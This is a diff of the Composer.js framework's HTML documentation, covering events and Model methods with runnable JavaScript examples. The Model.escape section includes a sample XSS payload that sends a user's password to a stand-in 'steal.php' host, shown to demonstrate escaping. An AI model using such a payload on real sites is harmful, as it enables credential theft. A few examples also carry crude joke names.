@@ -1,226 +1,480 @@
 <!DOCTYPE html>
 <html lang="en">
-	<head>
-		<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
-		<meta http-equiv="Content-language" content="en" />
+<head>
+	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+	<meta http-equiv="Content-language" content="en" />
 
-		<title>Composer.js - overview and documentation</title>
+	<title>Composer.js - overview and documentation</title>
 
 
-		<link rel="stylesheet" type="text/css" href="doc.css" />
-	</head>
-	<body>
-		<div id="container" class="clear">
-			<div id="nav">
-				<ul>
-					<li>
-						<a href="#overview">Overview</a>
-						<ul>
-							<li><a href="#overview:diff">Framework comparison</a></li>
-						</ul>
-					</li>
-					<li>
-						<a href="#api">API</a>
-						<ul>
-							<li><a href="#api:events">Events</a></li>
-							<li><a href="#api:model">Model</a></li>
-							<li><a href="#api:collection">Collection</a></li>
-							<li><a href="#api:controller">Controller</a></li>
-							<li><a href="#api:router">Router</a></li>
-							<li><a href="#api:sync">sync</a></li>
-						</ul>
-					</li>
-				</ul>
-			</div>
+	<link rel="stylesheet" type="text/css" href="doc.css" />
+</head>
+<body>
 
-			<div id="content">
-				<h1 id="overview">Composer.js</h1>
-				<p>
-					Composer.js is a javascript MVC framework for <a href="http://mootools.net/">Mootools</a> that helps you grow 
-					and manage your front-end javascript application by splitting out separate pieces of functionality using the 
-					Model View Controller design pattern.
-				</p>
-				<p>
-					Composer.js borrows (and in some cases takes directly from) two incredible existing JS frameworks,
-					<a href="http://documentcloud.github.com/backbone/">backbone.js</a> and <a href="http://spinejs.com/">spine</a>, 
-					taking from both where we felt they were successful. The javascript world was lacking a Mootools alternative to
-					these frameworks, so we built Composer.js.
-				</p>
+<div id="container" class="clear">
 
-				<h2 id="overview:diff">Framework comparison</h2>
-				<p>
-					How is composer.js different from backbone and spine?
-				</p>
-				<table class="compare" cellpadding="0" cellspacing="0" border="0">
-					<tr>
-						<th width="10%">Feature</th>
-						<th width="30%"><a href="http://documentcloud.github.com/backbone/">Backbone.js</a></th>
-						<th width="30%"><a href="http://spinejs.com/">Spine</a></th>
-						<th width="30%">Composer.js</th>
-					</tr>
-					<tr>
-						<td>Collections</td>
-						<td>
-							Has a separate object for collections. Models are explicitely added to collections.
-						</td>
-						<td>
-							"Collections" are just a set of static member functions. Any instantiated model of a certain
-							type is implicitely added to that model's collection.
-						</td>
-						<td>
-							Has a separate object for collections. Models are explicitely added to collections. 
-							<strong>Models can exist in multiple collections.</strong>
-						</td>
-					</tr>
-					<tr>
-						<td>REST/ajax</td>
-						<td>
-							Has server-side data syncing which uses REST-type URLs to CRUD data.
-						</td>
-						<td>
-							Has server-side data syncing which uses REST-type URLs to CRUD data.
-						</td>
-						<td>
-							Assumes nothing about your data syncing and provides a supporting API to implement this yourself.
-							We plan to eventually emulate the other two frameworks, but this is not the highest priority.
-						</td>
-					</tr>
-					<tr>
-						<td>Event triggering</td>
-						<td>
-							Supports passing a {silent: true} object to silence all events during an operation.
-						</td>
-						<td>
-							Supports passing a {silent: true} object to silence all events during an operation.
-						</td>
-						<td>
-							Supports passing a {silent: true} object to silence all events during an operation, but also supports
-							passing {not_silent: ['add', 'reset']} object to tell the framework "the only events that are allowed
-							to fire during this operation are 'add' and 'reset'"
-						</td>
-					</tr>
-					<tr>
-						<td>Supporting libraries</td>
-						<td>
-							One-file library.
-						</td>
-						<td>
-							Has multiple files dealing with different sets of functionality. Overall, has the most supporting
-							libraries and functions.
-						</td>
-						<td>
-							One-file library.
-						</td>
-					</tr>
-					<tr>
-						<td>"Controller" vs "View"</td>
-						<td>View</td>
-						<td>Contoller</td>
-						<td>Controller</td>
-					</tr>
-					<tr>
-						<td>Framework</td>
-						<td>jQuery</td>
-						<td>jQuery</td>
-						<td>Mootools</td>
-					</tr>
-				</table>
-				<p>
-					Note that this table is meant to highlight the differences. There are many more similarities between the
-					frameworks.
-				</p>
+<div id="nav">
+	<ul>
+		<li><a href="#overview"><strong>Composer.js</strong></a></li>
+		<li><a href="#overview:diff">Framework comparison</a></li>
+		<li>
+			<a href="#api:events">Events</a>
+			<ul>
+				<li><a href="#api:events:bind">bind</a></li>
+				<li><a href="#api:events:unbind">unbind</a></li>
+				<li><a href="#api:events:trigger">trigger</a></li>
+			</ul>
+		</li>
+		<li>
+			<a href="#api:model">Model</a>
+			<ul>
+				<li><a href="#api:model:extend">extend</a></li>
+				<li><a href="#api:model:constructor">init (constructor)</a></li>
+				<li><a href="#api:model:set">set</a></li>
+				<li><a href="#api:model:unset">unset</a></li>
+				<li><a href="#api:model:get">get</a></li>
+				<li><a href="#api:model:escape">escape</a></li>
+				<li><a href="#api:model:has">has</a></li>
+				<li><a href="#api:model:clear">clear</a></li>
+				<li><a href="#api:model:id">id</a></li>
+				<li><a href="#api:model:data">data</a></li>
+				<li><a href="#api:model:toJSON">toJSON</a></li>
+				<li><a href="#api:model:defaults">defaults</a></li>
+				<li><a href="#api:model:fetch">fetch</a></li>
+				<li><a href="#api:model:save">save</a></li>
+			</ul>
+		</li>					
+		<li><a href="#api:collection">Collection</a></li>
+		<li><a href="#api:controller">Controller</a></li>
+		<li><a href="#api:router">Router</a></li>
+		<li><a href="#api:sync">sync</a></li>
+	</ul>
+</div>
 
-				<h1 id="api">API</h1>
-				<p>
-					This is the actual documentation of the Composer.js programming API.
-				</p>
-				<h2 id="api:events">Events</h2>
-				<p>
-					Events are the main way different pieces of your application communicate with each other. Events are also
-					used by the framework itself to notify your application of changes to data or interfaces.
-				</p>
-				<p>
-					The <a href="#api:model">Model</a>, <a href="#api:collection">Collection</a>, and
-					<a href="#api:Controller">Controller</a> objects all implement Events, so anything available in events is
-					available in instances of these objects as well.
-				</p>
-				<p>
-					Example of event being used in your app:
-				</p>
-				<pre>
-var MyController = Composer.Controller.extend({ ...  });
+<div id="content">
+
+<h1 id="overview">Composer.js</h1>
+<p>
+	Composer.js is a javascript MVC framework for <a href="http://mootools.net/">Mootools</a> that helps you grow 
+	and manage your front-end javascript application by splitting out separate pieces of functionality using the 
+	Model View Controller design pattern.
+</p>
+<p>
+	Composer.js borrows (and in some cases takes directly from) two incredible existing JS frameworks,
+	<a href="http://documentcloud.github.com/backbone/">backbone.js</a> and <a href="http://spinejs.com/">spine</a>, 
+	taking from both where we felt they were successful. The javascript world was lacking a Mootools alternative to
+	these frameworks, so we built Composer.js.
+</p>
+
+<h2 id="overview:diff">Framework comparison</h2>
+<p>
+	How is composer.js different from backbone and spine?
+</p>
+<table class="compare" cellpadding="0" cellspacing="0" border="0">
+	<tr>
+		<th width="10%">Feature</th>
+		<th width="30%"><a href="http://documentcloud.github.com/backbone/">Backbone.js</a></th>
+		<th width="30%"><a href="http://spinejs.com/">Spine</a></th>
+		<th width="30%">Composer.js</th>
+	</tr>
+	<tr>
+		<td>Collections</td>
+		<td>
+			Has a separate object for collections. Models are explicitely added to collections.
+		</td>
+		<td>
+			"Collections" are just a set of static member functions. Any instantiated model of a certain
+			type is implicitely added to that model's collection.
+		</td>
+		<td>
+			Has a separate object for collections. Models are explicitely added to collections. 
+			<strong>Models can exist in multiple collections.</strong>
+		</td>
+	</tr>
+	<tr>
+		<td>REST/ajax</td>
+		<td>
+			Has server-side data syncing which uses REST-type URLs to CRUD data.
+		</td>
+		<td>
+			Has server-side data syncing which uses REST-type URLs to CRUD data.
+		</td>
+		<td>
+			Assumes nothing about your data syncing and provides a supporting API to implement this yourself.
+			We plan to eventually emulate the other two frameworks, but this is not the highest priority.
+		</td>
+	</tr>
+	<tr>
+		<td>Event triggering</td>
+		<td>
+			Supports passing a {silent: true} object to silence all events during an operation.
+		</td>
+		<td>
+			Supports passing a {silent: true} object to silence all events during an operation.
+		</td>
+		<td>
+			Supports passing a {silent: true} object to silence all events during an operation, but also supports
+			passing {not_silent: ['add', 'reset']} object to tell the framework "the only events that are allowed
+			to fire during this operation are 'add' and 'reset'"
+		</td>
+	</tr>
+	<tr>
+		<td>Supporting libraries</td>
+		<td>
+			One-file library.
+		</td>
+		<td>
+			Has multiple files dealing with different sets of functionality. Overall, has the most supporting
+			libraries and functions.
+		</td>
+		<td>
+			One-file library.
+		</td>
+	</tr>
+	<tr>
+		<td>"Controller" vs "View"</td>
+		<td>View</td>
+		<td>Contoller</td>
+		<td>Controller</td>
+	</tr>
+	<tr>
+		<td>Framework</td>
+		<td>jQuery</td>
+		<td>jQuery</td>
+		<td>Mootools</td>
+	</tr>
+</table>
+<p>
+	Note that this table is meant to highlight the differences. There are many more similarities between the
+	frameworks.
+</p>
+
+<h2 id="api:events">Composer.Events</h2>
+<p>
+	Events are the main way different pieces of your application communicate with each other. Events are also
+	used by the framework itself to notify your application of changes to data or interfaces.
+</p>
+<p>
+	The <a href="#api:model">Model</a>, <a href="#api:collection">Collection</a>, and
+	<a href="#api:Controller">Controller</a> objects all implement Events, so anything available in events is
+	available in instances of these objects as well.
+</p>
+<p>
+	Example of event being used in your app:
+</p>
+
+<pre class="runnable">var MyController = Composer.Controller.extend({});
 
 var con = new MyController();
 con.bind('alertme', function(name) {
 	alert('Hai, '+ name +', this is your alert');
 });
-con.trigger('alertme', 'Andrew') </pre>
-				<p>
-					Example of event being used by the framework:
-				</p>
-				<pre>var Note = Composer.Model.extend();
+con.trigger('alertme', 'Andrew')</pre>
+<p>
+	Example of event being used by the framework:
+</p>
+<pre class="runnable">var Note = Composer.Model.extend({});
 var mynote = new Note({ text: 'get a job' });
 mynote.bind('change', function(note) {
-	alert('Your note changed: '+ note.get('text'));
+alert('Your note changed: '+ note.get('text'));
 });
 mynote.set({ text: 'my goat hurts' });</pre>
-				<p>
-					The framework triggers events when certain actions happen in your Models or Collections.
-				</p>
+<p>
+	The framework triggers events when certain actions happen in your Models or Collections.
+</p>
 
 
-				<h3 id="api:events:bind">Events.bind <small>object.bind(event_name, callback)</small></h3>
-				<p>
-					Binds an event to object. The event under "event_name" can be an arbitrary string, or an event used by
-					Composer.js internally. 
-				</p>
-				<p>
-					There are two special events to be aware of:
-				</p>
-				<ul>
-					<li>
-						<h4>all</h4>
-						<p>
-							The "all" event is triggered <em>whenever</em> another event is triggered:
-						</p>
-						<pre>mymodel.bind('all', function() { alert('something happened!!!!!!!1'); });
+<h3 id="api:events:bind">Events.bind <small>object.bind(event_name, callback)</small></h3>
+<p>
+	Binds an event to object. The event under "event_name" can be an arbitrary string, or an event used by
+	Composer.js internally. 
+</p>
+<p>
+	There are two special events to be aware of:
+</p>
+<ul>
+	<li>
+		<h4>all</h4>
+		<p>
+			The "all" event is triggered <em>whenever</em> another event is triggered:
+		</p>
+
+		<pre>mymodel.bind('all', function() { alert('something happened!!!!!!!1'); });
 mymodel.trigger('make_babies');		// <- this will trigger the "all" event</pre>
 
-					</li>
-					<li>
-						<h4>change:[model key]</h4>
-						<p>
-							The "change" event is called whenever a model is changed using Model.set(). However, for each key
-							in the model that was changed, a specific event will be triggered for that key:
-						</p>
-						<pre>var mymodel = new MyModel({name: 'larry', age: 54});
+	</li>
+	<li>
+		<h4>change:[model key]</h4>
+		<p>
+			The "change" event is called whenever a model is changed using Model.set(). However, for each key
+			in the model that was changed, a specific event will be triggered for that key:
+		</p>
+
+		<pre>var mymodel = new MyModel({name: 'larry', age: 54});
 mymodel.bind('change:name', function(model, value) {
 	alert('The new name of the model is '+ value);
 });
 mymodel.set({ age: 43 });		// <- this will NOT trigger the above event
 mymodel.set({ name: 'suzy' });		// <- this will trigger the event, because the name changed</pre>
-					</li>
-				</ul>
-				<h3 id="api:events:bind">Events.trigger <small>object.trigger(event_name, [arg1, [arg2, ...]])</small></h3>
-				<p>
-					Trigger the given event of an object. If no callbacks are bound to this event, nothing will happen. If there
-					are callbacks bound, they will be called in the order they were bound to the object.
-				</p>
-				<p>
-					An arbitrary number of arguments can be passed into the trigger function, each of those being passed directly
-					into each callback being triggered:
-				</p>
-				<pre>mycontroller.bind('tag_clicked', function(tag_name, user_name) {
+	</li>
+</ul>
+<h3 id="api:events:unbind">Events.unbind <small>object.unbind(event_name, callback)</small></h3>
+<p>
+	Removes a previously-bound callback function from an object. If no callback is specified, all callbacks for the event will be removed.
+	If no event is specified, all event callbacks on the object will be removed.
+</p>
+
+<pre>mymodel.unbind("change", onChange);	// Removes the onChange callback
+						
+mymodel.unbind("change");		// Removes all "change" callbacks
+
+mymodel.unbind();			// Removes all callbacks on the object</pre>
+
+<h3 id="api:events:trigger">Events.trigger <small>object.trigger(event_name, [arg1, [arg2, ...]])</small></h3>
+<p>
+	Trigger the given event of an object. If no callbacks are bound to this event, nothing will happen. If there
+	are callbacks bound, they will be called in the order they were bound to the object.
+</p>
+<p>
+	An arbitrary number of arguments can be passed into the trigger function, each of those being passed directly
+	into each callback being triggered:
+</p>
+
+<pre>mycontroller.bind('tag_clicked', function(tag_name, user_name) {
 	alert('user '+ user_name + 'clicked the tag "'+ tag_name +'"');
 });
 mycontroller.trigger('tag_clicked', 'fisting', 'larry');</pre>
-				<h2 id="api:model">Model</h2>
-				<h2 id="api:collection">Collection</h2>
-				<h2 id="api:controller">Controller</h2>
-				<h2 id="api:router">Router</h2>
-				<h2 id="api:sync">sync</h2>
-			</div>
-		</div>
+
+<h2 id="api:model">Model</h2>
+<p>
+	Models are classes that deal with data, the heart of any JavaScript application. They deal with loading and manipulating data from various
+	sources	(AJAX, local storage, etc.), and they make wrapping your actual data easy. Models tie in well with collections or controllers via
+	events to allow	for easy updating and rendering.
+</p>
+<p>
+ 	Models also tie in with the <code><a href="#api:sync">Composer.sync</a></code> function to provide a central place for saving/updating
+	information with a server.
+</p>
+<p>
+	The following is a contrived example, but it demonstrates defining a model with a custom method, setting an attribute, and firing an event
+	keyed to changes in that specific attribute. After running this code once, <code>sidebar</code> will be available in your browser's
+	console, so you can play around with it.
+</p>
+<pre class="runnable">var Nav = Composer.Model.extend({
+	promptColor: function() {
+		var cssColor = prompt("Please enter a CSS color:");
+		this.set({color: cssColor});
+	}
+});
+
+window.nav = new Nav;
+
+nav.bind('change:color', function(model, color) {
+	$('nav').style.backgroundColor = color;
+});
+
+nav.set({color: 'white'});
+
+nav.promptColor();</pre>
+
+<h3 id="api:model:extend">Model.extend <small>Composer.Model.extend([properties])</small></h3>
+<p>
+	To create a <em>Model</em> class of your own, you extend <em>Composer.Model</em> and provide instance <em>properties</em>.
+</p>
+<pre>var Disease = Composer.Model.extend({
+
+	init: function() { ... },			// runs on instantiation
+
+	get_symptoms: function() { ... },
+
+	is_sexually_transmitted: function() { ... }
+});</pre>
+
+<h3 id="api:model:constructor">Model.init (constructor) <small>new Model([attributes])</small></h3>
+<p>
+	When creating an instance of a model, you can pass in the initial values of the attributes, which will be
+	<code><a href="#api:model:set">set</a></code> on the model.	If you define an init function, it will be invoked when the model is created.
+</p>
+<pre class="runnable">var Disease = Composer.Model.extend({
+	init: function() {
+		alert("you have " + this.get('name') + " lol");
+	}
+});
+
+var disease = new Disease({
+	name: "herpes"
+});</pre>
+
+<h3 id="api:model:set">Model.set <small>model.set(attributes, [options])</small></h3> 
+<p>
+	Sets one or more attributes for the model, triggering change events for individual attributes that change,
+	and also a general change event if the model has changed. These events are only triggered if an attribute actually changes;
+	setting an attribute to the same value it currently is will not trigger events.
+</p>
+<p>For example: <code>model.set({name: "fisty", age: 21});</code> will trigger the events:</p>
+<ul>
+	<li><code>"change:name"</code></li>
+	<li><code>"change:age"</code></li>
+	<li><code>"change"</code></li>
+</ul>
+<p>
+	If the model belongs to a collection, the events will bubble up to that collection as well, so as to notify the collection of
+	any display changes needed.
+</p>
+
+<h3 id="api:model:unset">Model.unset <small>model.unset(attribute, [options])</small></h3> 
+<p>
+	Unsets one data attribute from the model. Fires change events unless a <code>silent</code> option is passed.
+</p>
+
+<h3 id="api:model:get">Model.get <small>model.get(attribute)</small></h3>
+<p>Get the current value of an attribute from the model. For example: <code>disease.get('is_sexually_transmitted')</code></p>
+
+<h3 id="api:model:escape">Model.escape <small>model.escape(attribute)</small></h3>
+<p>
+	The same as <code><a href="#api:model:get">get</a></code>, except any HTML characters will be escaped when the attribute is a string.
+	This is	useful for preventing XSS-type attacks when loading data from your model into the DOM.
+</p>
+
+<pre class="runnable">var Hacker = Composer.Model.extend();
+
+var hacker = new Hacker({
+	name: "&lt;script>window.href = 'http://northkorea.com/steal.php?pw='+user.password&lt;/script&gt;"
+});
+
+alert(hacker.escape('name'));</pre>
+
+<h3 id="api:model:has">Model.has <small>model.has(attribute)</small></h3>
+<p>Returns <code>true</code> if the attribute is set to a non-null or non-undefined value.</p>
+
+<h3 id="api:model:clear">Model.clear <small>model.clear(option)</small></h3>
+<p>Clears all data out of the model. Fires change events unless a <code>silent</code> option is passed.</p>
+
+<h3 id="api:model:id">Model.id <small>model.id()</small></h3>
+<p>
+	Ids are special identifier values, either string or integer. Models can be retrieved by id from collections, and the id is used to
+	generate model URLs by default. The <code>id</code> method is a convenient way of retrieving any id stored in the Model's data.
+</p>
+<pre class="runnable">var Employee = Composer.Model.extend();
+
+var jeff = new Employee({
+	id: 657932
+});
+
+alert(jeff.id());</pre>
+
+<h3 id="api:model:data">Model.data <small>model.data</small></h3>
+<p>
+	A model's data attribute contains all of the attributes corresponding to the model's state. These attributes can be accessed using the
+	<code><a href="#api:model:get">get</a></code> and <code><a href="#api:model:set">set</a></code> methods.
+</p>
+
+<h3 id="api:model:toJSON">Model.toJSON <small>model.toJSON()</small></h3>
+<p>
+	Returns a copy (not reference) of the model's data attributes. This can be useful for handing off data to views, adding any data as
+	necessary without affecting the actual model. Note, this doesn't actually return JSON.
+</p>
+
+<pre class="runnable">var Employee = Composer.Model.extend();
+
+var peon = new Employee({
+	id: 		657932,
+	first_name:	'Jeff'
+});
+
+alert(peon.toJSON());			// Not really JSON!
+alert(peon.toJSON().first_name);	// See?
+</pre>
+
+<h3 id="api:model:defaults">Model.defaults <small>model.defaults</small></h3>
+<p>
+	The defaults object can be used to specify the default attributes for your model. When creating an instance of the model, any unspecified
+	attributes will be set to their default value.
+</p>
+
+<pre class="runnable">var Meal = Composer.Model.extend({
+	defaults: {
+		appetizer:  "caesar salad",
+		entree:     "ravioli",
+		dessert:    "cheesecake"
+	}
+});
+
+alert("Dessert will be " + (new Meal()).get('dessert'));</pre>
+
+<h3 id="api:model:fetch">Model.fetch <small>model.fetch([options])</small></h3>
+<p>
+	Populates the model's state from the server. Useful if the model has never been populated with data, or if you'd like to ensure that you
+	have the latest server state. A "change" event will be triggered if the server's state differs from the current attributes. Accepts
+	<code>success</code> and <code>error</code> callbacks in the options hash, which are passed <code>(model, response)</code> as arguments.
+</p>
+
+<pre>// Get the person model state from server
+person.fetch();</pre>
+
+<h3 id="api:model:save">Model.save <small>model.save([attributes], [options])</small></h3>
+<p>
+	Save a model to your database (or alternative persistence layer), by delegating to <code><a href="#api.sync">Composer.sync</a></code>.
+	The <strong>attributes</strong> object
+	(as in <code><a href="#api:model:set">set</a></code>) should contain the attributes you'd like to change &mdash; <u>keys that aren't
+	mentioned won't be altered.</u><sup>???</sup> If the model has a validate method, and validation fails, the model will not be saved. If
+	the model <code><a href="#api:model:is_new">is_new()</a></code>, the save will be a <code>"create"</code> (HTTP <code>POST</code>), if the
+	model already exists on	the server, the save will be an	<code>"update"</code> (HTTP <code>PUT</code>).
+</p>
+<p>
+	In the following example, notice how our overridden version of <code>Composer.sync</code> receives a <code>"create"</code> request the
+	first time the model is saved and an <code>"update"</code> request the second time.
+</p>
+
+<pre class="runnable">Composer.sync = function(method, model) {
+	alert(method + ": " + JSON.stringify(model));
+	model.set({id: 1})
+};
+
+var Book = Composer.Model.extend();
+
+var my_book = new Book({
+	title: "Quitting Your Job for Dummies",
+	author: "Andrew"
+});
+
+my_book.save();				// sync does a "create"
+
+my_book.save({author: "Jeff"});		// sync does an "update"</pre>
+<p>
+	<strong>save</strong> accepts <code>success</code> and <code>error</code> callbacks in the options hash, which are passed
+	<code>(model, response)</code> as arguments. The <code>error</code> callback will also be invoked if the model has a validate
+	method, and validation fails. If a server-side validation fails, return a non-200 HTTP response code, along with an error response
+	in text or JSON.
+</p>
+<pre>my_book.save({author: "F.D.R."}, {error: function(){ ... }});</pre>
+
+<h2 id="api:collection">Collection</h2>
+<h2 id="api:controller">Controller</h2>
+<h2 id="api:router">Router</h2>
+<h2 id="api:sync">sync</h2>
+
+</div>
+</div>
+		<script src="mootools.js"></script>
+		<script src="composer.js"></script>
+
+		<script>
+		var $E = function(selector, filter){ return ($(filter) || document).getElement(selector); };
+		var $ES = function(selector, filter){ return ($(filter) || document).getElements(selector); };
+		
+		// Set up the "play" buttons for each runnable code example.
+		window.addEvent('domready', function() {
+			var runnables = $ES('.runnable');
+			runnables.each(function(el) {
+				var button = $(document.createElement('button'));
+				var code = el.innerHTML;
+				button.innerHTML = 'Run Code';
+				button.addEvent('click', function(e) { eval(code) });
+				el.insertBefore(button);			
+			});
+		});
+		</script>
 	</body>
 </html>
 
